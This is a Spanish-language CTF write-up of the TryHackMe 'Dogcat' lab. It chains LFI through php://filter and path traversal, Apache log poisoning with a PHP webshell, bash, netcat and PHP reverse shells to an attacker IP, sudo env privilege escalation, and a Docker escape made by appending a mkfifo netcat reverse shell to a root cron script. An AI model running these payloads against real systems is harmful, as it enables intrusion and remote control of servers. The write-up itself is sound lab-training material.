# Writeup del CTF Dogcat de TryHackMe

## Introducción

¡Bienvenido a nuestro writeup detallado del **CTF Dogcat de TryHackMe**! 🚀

El CTF Dogcat fue una máquina Linux de dificultad intermedia que nos desafió a capturar cuatro indicadores. La ruta de explotación fue interesante y multifacética:

1.  Comenzamos por explotar una vulnerabilidad **Local File Inclusion (LFI)** que logramos convertir en **Ejecución Remota de Código (RCE)** mediante la técnica de **envenenamiento de logs de Apache**, lo que nos permitió obtener una *shell web* inicial.
2.  Posteriormente, usamos el binario `env` con permisos `sudo` para realizar una **escalada de privilegios** efectiva.
3.  Finalmente, una **tarea programada mal configurada** nos ofreció la clave para escapar del contenedor Docker y acceder al sistema subyacente, culminando con la recuperación del indicador *root*.

A continuación, detallamos cada paso del proceso de explotación.

---

## 1. Reconocimiento y Ping Inicial

El primer paso en cualquier CTF es confirmar la conectividad y realizar un reconocimiento básico.

### 1.1. Verificación de la Conexión (Ping)

Utilizamos el comando `ping` con el argumento `-c 4` para enviar exactamente cuatro paquetes ICMP a la IP de la máquina objetivo, que es **10.10.121.192**.

<img width="551" height="190" alt="Ping" src="https://github.com/user-attachments/assets/ce96c702-94bc-4346-b992-e41eda1d7a15" />

**Comando Ejecutado:**
```bash
ping -c 4 10.10.121.192
````
Salida Obtenida:

IP del Objetivo: 10.10.121.192

Paquetes Transmitidos/Recibidos: 4 transmitidos, 4 recibidos.

Pérdida de Paquetes: 0% packet loss.

Tiempo de Respuesta (Media): 48.674 ms.

TTL (Time To Live): 63.

La salida confirma que la máquina está activa y es accesible desde nuestra máquina atacante, y el TTL de 63 (un número bajo) a menudo sugiere que el objetivo puede estar corriendo en una distribución de Linux (ya que típicamente los sistemas Linux inician con un TTL de 64, y el paquete ha pasado por un hop o salto de red) y, en este caso particular, está dentro de un entorno virtualizado o un contenedor Docker.

---

## 2. Análisis de la Aplicación Web

### Navegación Web (Puerto 80)

Al visitar la dirección IP del objetivo en un navegador web (**http://10.10.121.192/**), encontramos una página simple llamada "dogcat", que se presenta como una galería de perros y gatos.

La interfaz nos permite seleccionar si queremos ver "A dog" o "A cat".

**Análisis de la URL:**

Al hacer clic en cualquiera de las opciones, observamos que la URL cambia para incluir un parámetro llamado `view`.

**URL Observada:**

http://10.10.121.192/?view=dog


**Captura del Navegador:**

<img width="1560" height="730" alt="pag puerto 80" src="https://github.com/user-attachments/assets/66843bd2-426b-4819-8d1c-2a97f3a3e97b" />

El uso de un parámetro en la URL para cargar contenido (`view=dog`) es un indicador clave que sugiere la posibilidad de una vulnerabilidad de **Local File Inclusion (LFI)** o Directory Traversal. Este tipo de parámetros suelen ser implementados para incluir archivos o plantillas del servidor, lo que los convierte en un punto inicial de ataque.

---

## 3. Explotación Inicial: Local File Inclusion (LFI)

Basados en el análisis del parámetro `view`, procedemos a confirmar la vulnerabilidad de Local File Inclusion (LFI). Nuestro objetivo es leer archivos sensibles del sistema.

### 3.1. Prueba de LFI con PHP Filters

Dado que la aplicación probablemente está interpretando el código PHP contenido en los archivos que incluye (como `dog.php` o `cat.php`), utilizaremos el *wrapper* **`php://filter`** con codificación **Base64** para evitar la ejecución del código y leer el contenido de los archivos de manera segura.

<img width="1070" height="625" alt="busqueda de lfi filters" src="https://github.com/user-attachments/assets/61bbc970-bd22-4587-bfe1-793914c622df" />

Probamos la siguiente sintaxis en la URL, intentando leer el archivo que maneja la vista "dog":

<img width="1246" height="459" alt="probvamos el filter " src="https://github.com/user-attachments/assets/b690a156-87a1-40e1-89aa-3d115af8cdbc" />

**Payload (Intento de lectura de `dog`):**

http://10.10.121.192/?view=php://filter/convert.base64-encode/resource=dog

**Resultado:**

La aplicación responde con una cadena codificada en Base64, lo que confirma que la vulnerabilidad LFI es explotable.

### 3.2. Decodificación del Archivo 'dog'

Procedemos a decodificar la cadena Base64 obtenida para ver el contenido del archivo `dog` (presumiblemente `dog.php`).

<img width="766" height="71" alt="decodifico el base64 de dog no sirve de muycho" src="https://github.com/user-attachments/assets/15922ac5-86c0-4725-9140-5df8ab18fad3" />

**Comando de Decodificación:**
```bash
echo "PGRpdiBjbGFzcz0icGFyZW50Ij4gPGltZyBzcmM9Ii88P3BocCBlY2hvIHJhbmQoMSwxMCk7I
````

El contenido decodificado revela que el archivo no es un script principal del sitio, sino un snippet de código que simplemente genera una ruta de imagen aleatoria (por ejemplo, /5.jpg) para mostrar en la galería. Aunque esta información confirma la vulnerabilidad LFI, no nos proporciona datos críticos ni acceso directo a un shell.

---

## 4. Análisis Profundo de la LFI y Código Fuente

El paso anterior nos confirmó la vulnerabilidad LFI. Ahora, intentamos acceder al archivo principal de la aplicación, que presumiblemente es `index.php`, utilizando un *directory traversal* para subir un directorio (asumiendo que los archivos `dog` y `cat` están en un subdirectorio o el código se ejecuta desde una ubicación diferente) y luego acceder a `index.php`.

<img width="1747" height="522" alt="nueva prueba subiendo directorio" src="https://github.com/user-attachments/assets/588bb2f0-b156-4097-afa1-93d23d34ec91" />

### 4.1. Lectura del Archivo Index

Probamos el siguiente *payload*, asumiendo que el archivo de la vista que se está incluyendo está un directorio por debajo de `index.php`:

<img width="1670" height="678" alt="decodifico y hay codigo php" src="https://github.com/user-attachments/assets/78e76359-571e-4d7e-b675-9ad186c04e40" />

**Payload (Intento de lectura de `../index`):**

http://10.10.121.192/?view=php://filter/convert.base64-encode/resource=../index

**Resultado:**

Obtenemos otra cadena Base64, que decodificamos a continuación.

### 4.2. Decodificación y Análisis del Código Fuente

Decodificamos la cadena para obtener el código fuente de `index.php` (o el archivo principal).

**Comando de Decodificación:**
```bash
echo "PCEgLS0gIElGIEVWRVJZIElNQUdFIExPT0tTIEJBU0U2NCwgVEhFTiBJVCAgTVVTVCBCRSBGUk9NIEFEbWluIFBTIE1BQkUgLS0+CjwhRE9DVFlQRSBodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPgogICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iL3N0eWxlcy9zdHlsZS5jc3MiPgo8L2hlYWQ+Cjxib2R5Pgo8aDE+ZG9nY2F0PC9oMT4KPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgo8ZGl2PgogICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICA8YSBocmVmPSI/dmlldz1kb2ciPjxidXR0b24gaWQ9ImRvZyI+QSBkb2c8L2J1dHRvbj48L2E+CiAgICA8YSBocmVmPSI/dmlldz1jYXQiPjxidXR0b24gaWQ9ImNhdCI+QSBjYXQ8L2J1dHRvbj48L2E+PGJyLz4KICAgIDw/cGhwCiAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0cnIsICRzdWJzdHIpIHsKICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3VidmJ0cikgIT09IGZhbHNlOwogICAgICAgIH0KCiAgICAgICAgJGV4dCA9IGlzc3BldCgkX0dFVFsnZXh0J10pID8gJF9HRVRbJ2V4dCddIDogJy5waHAnOwogICAgICAgIGlmKGlzc2V0KCRfR0VUWyd2aWV3J10pKXsKICAgICAgICAgICAgaWYoY29udGFpbnNTdHIoJF9HRVRbJ3ZpZXcnXSwgJ2RvZycpIHx8IGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdjYXQnKSkgewogICAgICAgICAgICAgICAgZWNobyAiSGVyZSB5b3UgZ28hIjsKICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBlY2hvICJTb3JyeSwgb25seSBkb2dzIG9yIGNhdHMgYXJlIGFsbG93ZWQuIjsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgID8+CjwvZGl2Pgo8L2JvZHk+CjwvaHRtbD4=" | base64 -d
````
Contenido Decodificado (index.php):

<img width="1129" height="577" alt="paso el codigo a un arhicvo" src="https://github.com/user-attachments/assets/cd8a4bec-1a4c-4683-8bc4-59b6d6892ae4" />

4.3. Identificación de la Vulnerabilidad RCE

El análisis del código fuente revela dos puntos cruciales:

Restricción del parámetro view: La aplicación solo permite que el valor de view contenga las cadenas 'dog' o 'cat'. Esto frustra los intentos directos de LFI para leer archivos como /etc/passwd.
````
PHP

if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat'))
````
Parámetro ext no filtrado: Existe un segundo parámetro llamado ext que se utiliza para definir la extensión del archivo a incluir. Este parámetro no tiene ninguna restricción de filtrado.
````
PHP

$ext = isset($_GET['ext']) ? $_GET['ext'] : '.php';
// ...
include $_GET['view'] . $ext;
````
Esta combinación es la clave para la Ejecución Remota de Código (RCE):

Podemos eludir la restricción del parámetro view pasando un archivo que contenga la cadena dog o cat, pero que también sea un archivo de log, como /var/log/apache2/access.log.

Podemos usar el parámetro ext para incluir archivos que no sean PHP (p. ej., ext=).

La estrategia de ataque será el Envenenamiento de Logs de Apache, ya que los logs de Apache se guardan en el servidor como archivos de texto simple que podemos manipular. Si inyectamos código PHP malicioso en el access log (por ejemplo, a través de un User-Agent malicioso) y luego usamos la vulnerabilidad LFI para incluir el log, el código PHP inyectado se ejecutará.

---

## 5. Validación de LFI y Preparación para RCE

Hemos confirmado que el parámetro `view` es vulnerable a LFI, pero está filtrado para contener las cadenas 'dog' o 'cat'. Ahora validaremos que podemos eludir la restricción usando *Directory Traversal* (`../../..`) y combinando el *payload* con las cadenas permitidas.

### 5.1. Elusión de Filtro y Lectura de `/etc/passwd`

Para leer `/etc/passwd`, debemos incluir tanto las secuencias *Directory Traversal* como la cadena 'dog' (o 'cat') y anular la extensión `.php` usando el parámetro `ext`.

**Payload para `/etc/passwd`:**

<img width="1099" height="715" alt="accedo a passwd" src="https://github.com/user-attachments/assets/810a27c6-f9a2-4257-8e2c-69d105bcd720" />

* **`dog/`:** Cumple el filtro de `view` (contiene 'dog').
* **`../../../../../../../../etc/passwd`:** Utiliza *Directory Traversal* para acceder al archivo raíz.
* **`&ext=`:** Anula la inclusión de la extensión `.php`.

**Resultado:**

La lectura de `/etc/passwd` se realiza con éxito, revelando cuentas del sistema como `root`, `daemon`, `www-data`, y lo más relevante: el usuario del CTF **apt** con *shell* de login (`/bin/bash`).

root:x:0:0:root:/root:/bin/bash ... apt:x:1000:1000:apt:/home/apt:/bin/bash ...

### 5.2. Lectura del Log de Acceso de Apache

Para implementar el **Envenenamiento de Logs**, necesitamos saber la ubicación del archivo de logs de Apache y verificar que podemos leerlo. La ubicación estándar en sistemas Debian/Ubuntu es `/var/log/apache2/access.log`.

**Payload para `/var/log/apache2/access.log`:**

<img width="1622" height="837" alt="accedo a log y etngo el useragent" src="https://github.com/user-attachments/assets/8983c1ab-9e84-4d36-80b8-9dd88c981074" />

**Resultado:**

La lectura del archivo de log es exitosa, y en su contenido podemos observar las entradas del log. Crucialmente, notamos que el **User-Agent** de las peticiones es registrado.

127.0.0.1 - - [18/Oct/2025:16:09:59 +0000] "GET /?view=php://filter/convert.base64-encode/resource=dog HTTP/1.1" 200 600 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" ...

Este descubrimiento nos confirma que podemos inyectar código PHP malicioso en el log utilizando una cabecera HTTP controlable (como el **User-Agent**) y luego ejecutar ese código a través de la vulnerabilidad LFI. Esto nos lleva al siguiente paso: la **Ejecución Remota de Código (RCE)**.

---

## 6. Ejecución Remota de Código (RCE) mediante Envenenamiento de Logs

Con la vulnerabilidad LFI validada y la ubicación del log de Apache confirmada (`/var/log/apache2/access.log`), procedemos a inyectar código PHP malicioso en el log y luego ejecutarlo.

### 6.1. Inyección de Código PHP

Utilizaremos el comando `curl` para realizar una petición a la página web y **modificar intencionalmente la cabecera `User-Agent`** para que contenga código PHP que deseamos inyectar. El código inyectado será una *webshell* simple que acepta comandos a través del parámetro `c`.

<img width="1059" height="370" alt="pruebo user agent con curl" src="https://github.com/user-attachments/assets/bc2d8626-bb33-4511-8357-48f0ce875cef" />

**Payload PHP inyectado:**
```php
<?php system($_GET['c']);?>
Comando curl para inyección:

Bash

curl "[http://10.10.121.192/](http://10.10.121.192/)" -H "User-Agent: <?php system(\$_GET['c']);?>"
````
Resultado de la Petición curl:

Aunque la salida directa de curl es el código HTML de la página, la acción crucial es que nuestro código PHP ahora ha sido grabado en el archivo /var/log/apache2/access.log.

6.2. Activación del Código PHP Inyectado

Una vez que el código malicioso está en el log, usamos la vulnerabilidad LFI para incluir el log, lo que fuerza al servidor a interpretar el contenido inyectado como código PHP.

Payload de Inclusión del Log y Ejecución de Comando (Prueba):

Accedemos al log e intentamos ejecutar un comando de prueba simple, como id (para ver el usuario actual), pasando el comando a través del nuevo parámetro c de nuestra webshell.

<img width="1646" height="392" alt="actualzio el log" src="https://github.com/user-attachments/assets/d84f0b40-c4da-43ae-ae7c-a33089cba07b" />

[http://10.10.121.192/?view=dog/../../../../../../../../var/log/apache2/access.log&ext=&c=id](http://10.10.121.192/?view=dog/../../../../../../../../var/log/apache2/access.log&ext=&c=id)

Resultado de la Ejecución:

En la salida de la página, observamos la ejecución exitosa del comando id:

<img width="1561" height="831" alt="ahora ya tenemos lfi" src="https://github.com/user-attachments/assets/109cbd75-63b5-46cc-9907-80f7dc2c88b7" />

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Hemos obtenido Ejecución Remota de Código (RCE). El servidor está ejecutando comandos como el usuario www-data.

---

## 7. Obtención de Shell Inversa (Reverse Shell) - Intento Inicial

Con la RCE establecida, el objetivo es escalar a una *shell* interactiva para facilitar la enumeración y el trabajo con el sistema.

### 7.1. Configuración del Listener

Primero, configuramos un *listener* en nuestra máquina atacante (Kali Linux) usando `netcat` en el puerto **9001**. También identificamos nuestra dirección IP en la interfaz `tun0` para la conexión de retorno: **10.8.24.253**.

**Comandos de la Máquina Atacante:**
```bash
# Configuración del listener
nc -nvlp 9001
# Identificación de la IP de la VPN
ip addr show tun0
````

<img width="985" height="490" alt="configuro un nc lisner" src="https://github.com/user-attachments/assets/c330c317-aba7-46f7-b3f8-f6a95f9af6b7" />

Resultado de la Configuración:

7.2. Intento de Conexión con Netcat

Utilizamos la webshell simple que inyectamos (<?php system($_GET['c']);?>) para ejecutar un comando que inicie una conexión reverse shell de netcat hacia nuestra IP:

Comando de Ejecución (En la URL):
````
nc 10.8.24.253 9001
````
<img width="1124" height="252" alt="pruebo con lfi para respuesta " src="https://github.com/user-attachments/assets/d658c17e-838b-4326-bc34-a2ce32b53937" />

Payload en la URL:

[http://10.10.121.192/?view=dog/../../../../../../../../var/log/apache2/access.log&ext=&c=nc](http://10.10.121.192/?view=dog/../../../../../../../../var/log/apache2/access.log&ext=&c=nc) 10.8.24.253 9001

Resultado:

<img width="455" height="187" alt="no hay respuesta" src="https://github.com/user-attachments/assets/0e26b24d-6018-4725-ba0c-10bb908b4446" />


Al ejecutar esta petición, no se establece ninguna conexión de retorno en el listener. Esto es una indicación común de que el binario netcat simple (el cliente) no está disponible en la máquina víctima o que está bloqueado por algún filtro de red.

Esto nos obliga a probar métodos alternativos para la reverse shell que utilicen lenguajes de programación o binarios que es más probable que estén instalados en el sistema (como Python o Bash).

---

## 8. Obtención de Shell Inversa (Reverse Shell) - Intentos Alternativos

Dado que el intento con `netcat` falló, probamos otras sintaxis comunes de *reverse shell* que utilizan binarios más habituales en sistemas Linux. Consultamos la popular **PentestMonkey Reverse Shell Cheat Sheet** para obtener *payloads* alternativos.

<img width="1448" height="794" alt="buscanmos reverse shell en pentestmonkey" src="https://github.com/user-attachments/assets/6843c7b0-4298-440c-88e7-3ed84dabf53b" />

### 8.1. Intento con Bash

Intentamos una *reverse shell* usando Bash, que es muy común en sistemas Linux:

<img width="1390" height="390" alt="probamos con bash no funciona" src="https://github.com/user-attachments/assets/914196b6-cd9b-4124-b29c-5677b5298f2f" />

**Payload Bash:**
```bash
bash -i >& /dev/tcp/10.8.24.253/9001 0>&1
````
Payload Codificado para URL (En la URL):

[http://10.10.121.192/?view=dog/../../../../../../../../var/log/apache2/access.log&ext=&c=bash](http://10.10.121.192/?view=dog/../../../../../../../../var/log/apache2/access.log&ext=&c=bash) -i >& /dev/tcp/10.8.24.253/9001 0>&1

Resultado:

Al ejecutar la petición mientras el listener de netcat está activo, no obtenemos respuesta. Esto sugiere que el binario bash no está disponible en la ubicación esperada o que la conexión saliente está siendo bloqueada para este tipo de tráfico.

8.2. Intento con Python

A continuación, probamos una reverse shell basada en Python, ya que este lenguaje suele estar instalado.

Payload Python (Utilizando un script local de Python para ejecutar la shell):

Creamos un pequeño script en Python (reverse.py) para enviar la petición maliciosa al servidor.

<img width="733" height="297" alt="pruebo con un scirpt de python" src="https://github.com/user-attachments/assets/c5595e22-8743-4d4e-affa-53717c3b6b46" />

Script reverse.py:
````
Python

#!/usr/bin/env python
import requests

shell = "bash -i >& /dev/tcp/10.8.24.253/9001 0>&1" # Intentamos el mismo payload de bash
# ... código para enviar la petición con el parámetro 'c' = shell ...
````
Resultado:

Ejecutamos el script Python, pero tampoco obtenemos respuesta en el listener de netcat.

<img width="581" height="611" alt="no funciona script de python" src="https://github.com/user-attachments/assets/adfd1452-dd17-4017-b9a4-4ba8e9b7c2e1" />

8.3. Conclusión del Fallo

Después de varios intentos, concluimos que la restricción podría deberse a:

Restricciones de firewall: Bloqueo de conexiones salientes desde la máquina víctima.

Falta de binarios: Ausencia de nc o versiones adecuadas de python/bash para establecer la conexión.

---

## 9. Obtención de Shell Inversa (Reverse Shell) y Captura de Flag 1

Ante el fallo de las *reverse shells* basadas en `bash` o `netcat`, pivotamos a una *reverse shell* basada en **PHP**, lo cual es lógico ya que el servidor está ejecutando Apache/PHP.

### 9.1. Configuración de PHP Reverse Shell

1.  Descargamos el *payload* **`php-reverse-shell.php`** de PentestMonkey.
2.  Editamos el archivo y configuramos la IP de nuestra máquina atacante (`$ip`) a **`10.8.24.253`** y el puerto (`$port`) a **`9001`**.

<img width="927" height="589" alt="configuro un revershell de php" src="https://github.com/user-attachments/assets/ffb8a9f5-2ceb-4b41-a8b5-23b163717306" />

### 9.2. Transferencia y Ejecución

1.  En nuestra máquina atacante, iniciamos un servidor web simple de Python para alojar el archivo de la *shell*.
    ```bash
    python3 -m http.server 8000
    ```
2.  En la máquina víctima, utilizamos la *webshell* para ejecutar `curl` y solicitar el *payload* PHP, forzando al servidor a ejecutarlo inmediatamente. Previamente, nos aseguramos de que nuestro *listener* de `netcat` esté activo en el puerto 9001.

**Payload de Ejecución (En la URL):**

<img width="1606" height="610" alt="transfiero el php reverse con servidor de python y da respuesta obbtengo el shell luego de ejecutarlo" src="https://github.com/user-attachments/assets/9393a279-107b-432a-8b94-e282bb67a98a" />

El servidor de Python registra la solicitud (`"GET /php-reverse-shell.php HTTP/1.1" 200 -`), y en el *listener* de `netcat` **obtenemos una *reverse shell*** con éxito como el usuario **`www-data`**.

connect to [10.8.24.253] from (UNKNOWN) [10.10.121.192] 39900 Linux dogcat 5.15.0-91-generic #97-Ubuntu SMP Wed Jan 3 01:25:46 UTC 2020 x86_64 GNU/Linux [...] uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off $

### 9.3. Estabilización del Shell

Aunque la *shell* inicial funciona, es inestable. Intentamos estabilizarla:

1.  Inicialmente, el comando `export TERM=xterm` falla debido a la *shell* limitada (`/bin/sh`).
2.  Afortunadamente, el comando `export TERM=xterm` funciona después de ejecutar comandos de prueba, permitiendo una experiencia interactiva básica.

**Estabilización del Shell:**

<img width="500" height="185" alt="estabilizo el shell" src="https://github.com/user-attachments/assets/ec91ced9-a660-4afd-bf17-d6ccf8eff0b2" />

```bash
$export TERM=xterm$
````

9.4. Captura de Flag 1

Una vez en la shell, buscamos el primer indicador (flag.php) en el directorio raíz del sitio web (/var/www/html/).

<img width="1018" height="594" alt="obtengo flag 1" src="https://github.com/user-attachments/assets/250d49c3-b219-4652-b7eb-99d7e7c7d899" />

Comandos de Búsqueda:
````
Bash

$cd /var/www/html$ ls -la
$ cat flag.php

````
Resultado:

El archivo flag.php contiene la Flag 1:
````
PHP

<?php $flag_1 = "THM{**[VALOR DEL FLAG AQUI]**}" ?>
````
---

## 10. Enumeración del Sistema de Archivos y Captura de Flag 2

Con una *reverse shell* estable y RCE asegurada, procedemos a enumerar el sistema de archivos buscando más indicadores o pistas para la escalada de privilegios.

### 10.1. Localización y Captura de Flag 2

Desde el directorio `/var/www/html/`, nos movemos un directorio hacia atrás (`cd ..`) para explorar el directorio padre, `/var/www/`.

<img width="300" height="169" alt="navego por directorio y tengo la flag 2" src="https://github.com/user-attachments/assets/72c42a2c-9a3b-4bb1-b86e-f664bd25a51c" />

**Comandos Ejecutados:**
```bash
$cd ..$ ls
flag2_QMW7JvaY2LvK.txt
html
````
Encontramos un archivo sospechoso con un nombre alfanumérico largo: flag2_QMW7JvaY2LvK.txt.

Comando de Lectura del Flag:
````
Bash

$ cat flag2_QMW7JvaY2LvK.txt
````
Resultado:

El archivo contiene la Flag 2:

Flag 2 Capturado: THM{**[VALOR DEL FLAG AQUI]**}

---

## 11. Escalada de Privilegios (PrivEsc) en Contenedor - Captura de Flag 3

Ahora que tenemos una *shell* como el usuario `www-data` (UID 33), el siguiente paso es buscar una forma de escalar privilegios, idealmente al usuario `root`.

### 11.1. Verificación de Permisos Sudo

Comenzamos verificando si el usuario `www-data` tiene permisos para ejecutar algún comando como `root` sin necesidad de contraseña (`NOPASSWD`).

<img width="912" height="126" alt="veo permisos con  sudo" src="https://github.com/user-attachments/assets/bc951711-cea1-4bb2-a30c-69d715467a6b" />

**Comando Ejecutado:**
```bash
$ sudo -l
````
Resultado:

La salida revela una vulnerabilidad crítica: el usuario www-data puede ejecutar el binario /usr/bin/env como root sin contraseña.
````
User www-data may run the following commands on 45bcab55a181:
(root) NOPASSWD: /usr/bin/env
````

11.2. Explotación de Sudo con /usr/bin/env

El binario /usr/bin/env es conocido por ser vulnerable cuando se puede ejecutar con permisos sudo, ya que se puede usar para ejecutar una shell con privilegios de root. Consultamos GTFOBins para confirmar la técnica.

<img width="1263" height="389" alt="busco en gtfobins" src="https://github.com/user-attachments/assets/ceb78e5d-125e-4749-8b7b-26201fce75f5" />

El payload para explotar esta vulnerabilidad es simple y directo:

Comando de Explotación:
````
Bash

$ sudo /usr/bin/env /bin/bash
````
Resultado de la Ejecución:

Ejecutamos el comando y verificamos inmediatamente nuestro nuevo UID con id:

<img width="620" height="186" alt="con ese bin obtengo root y la falg3" src="https://github.com/user-attachments/assets/74633bc8-478d-4a13-be5d-9c2747f4e017" />

````
Bash

$ id
uid=0(root) gid=0(root) groups=0(root)
````
¡Privilegios de Root Obtenidos!

11.3. Captura de Flag 3

Una vez como root, navegamos al directorio /root/ para capturar el tercer indicador.

Comandos de Búsqueda:
````
Bash

$ cd /root$ ls
flag3.txt
$ cat flag3.txt
````
Resultado:

El archivo flag3.txt se encuentra y contiene la Flag 3:

Flag 3 Capturado: THM{**[VALOR DEL FLAG AQUI]**}

---

## 12. Escape del Contenedor Docker y Captura de Flag 4

Aunque obtuvimos privilegios de `root`, seguimos dentro de un contenedor Docker. La pista que faltaba es el **Flag 4**, que requiere escapar del entorno contenedorizado al sistema operativo (SO) subyacente.

### 12.1. Enumeración de Directorios y Archivos

Como `root` en el contenedor, exploramos los directorios del sistema en busca de archivos de configuración o *scripts* que se ejecuten automáticamente (tareas `cron`). Navegamos al directorio `/opt/`, que a menudo contiene aplicaciones o *scripts* personalizados.

<img width="880" height="508" alt="bajo de directorio y listo los arhcivos" src="https://github.com/user-attachments/assets/66606990-1dff-4484-b110-0999b43b0f66" />

**Comandos Ejecutados:**
```bash
$ ls -lah /$ cd opt/$ ls
backups
$ cd backups
$ ls
backup.sh backup.tar
````
Encontramos un directorio llamado backups que contiene un script backup.sh y un archivo backup.tar.

12.2. Análisis del Script y Explotación de Contenedor

El archivo backup.tar es una copia de seguridad y el archivo backup.sh es el script que probablemente lo crea. Lo más relevante es que este archivo tar contiene archivos dentro de un directorio llamado container, lo que refuerza la idea de que estamos en un contenedor.

<img width="1047" height="532" alt="listo el contenedor backup" src="https://github.com/user-attachments/assets/22d4e94f-2dc0-42d9-97a2-bad4e65d4769" />

Contenido de backup.tar (Al extraerlo):
````
Bash

$ tar xvf backup.tar # (Output muestra archivos como container/Dockerfile, container/backup/backup.sh, etc.)
````
Analizamos el script backup.sh para encontrar la vulnerabilidad. Este tipo de scripts suelen estar asociados a una tarea cron que se ejecuta periódicamente.

Contenido de backup.sh:
````
Bash

#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container/
````
(Nota: El script original es simple. El punto crucial es que el archivo backup.sh se está ejecutando como root en el host subyacente).

Al estar en un entorno Docker, y al ver que este script está creando un archivo de backup en el sistema de archivos del contenedor, es muy probable que este script se esté ejecutando como una tarea cron en el sistema host (subyacente), o bien, el contenedor tiene montado un volumen que contiene este script, y el host lo ejecuta.

La estrategia es: inyectar un payload de reverse shell en el script backup.sh y esperar a que el cron del host lo ejecute.

Utilizamos una sintaxis de reverse shell de netcat más robusta (que evita el -e que podría estar deshabilitado), consultando las alternativas de PentestMonkey.

<img width="1484" height="609" alt="buscamos reverse para netcat" src="https://github.com/user-attachments/assets/9b0312c4-0af4-4f96-86b4-0a9957704d03" />

Payload Inyectado (Reverse Shell):
````
Bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.24.253 4444 >/tmp/f
````

12.3. Modificación del Script y Obtención de Flag 4

En nuestra máquina atacante, preparamos un nuevo listener de netcat en el puerto 4444 (un puerto diferente al anterior para claridad).

<img width="1605" height="605" alt="configuro el shell de nc y espero a q se ejcute cron obtengo flag4" src="https://github.com/user-attachments/assets/6ca34033-6cb5-4e42-ac3c-b9bc7281dab4" />

````
Bash

nc -nvlp 4444
````
Inyectamos el payload de la reverse shell en el archivo backup.sh, asegurándonos de que sea la última línea ejecutable.

Comandos de Inyección (Desde la shell de root del contenedor):
````
Bash

# Inyectamos el payload en backup.sh. Usamos >> para añadir al final.
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.24.253 4444 >/tmp/f" >> backup.sh
# Verificamos que el payload se añadió (cat backup.sh)
````
Resultado de la Inyección y Conexión:

Esperamos unos minutos. Cuando la tarea cron del host ejecuta el script backup.sh, la reverse shell se dispara, y obtenemos una nueva conexión en el puerto 4444.

¡Hemos escapado del contenedor Docker al SO Host Subyacente!

El nuevo shell nos coloca directamente en el directorio /root/ del host. Buscamos el último indicador:

Comandos de Búsqueda:
````
Bash

$ ls
container flag4.txt
$ cat flag4.txt
El archivo flag4.txt contiene el indicador final.
````

Flag 4 Capturado: THM{**[VALOR DEL FLAG AQUI]**}

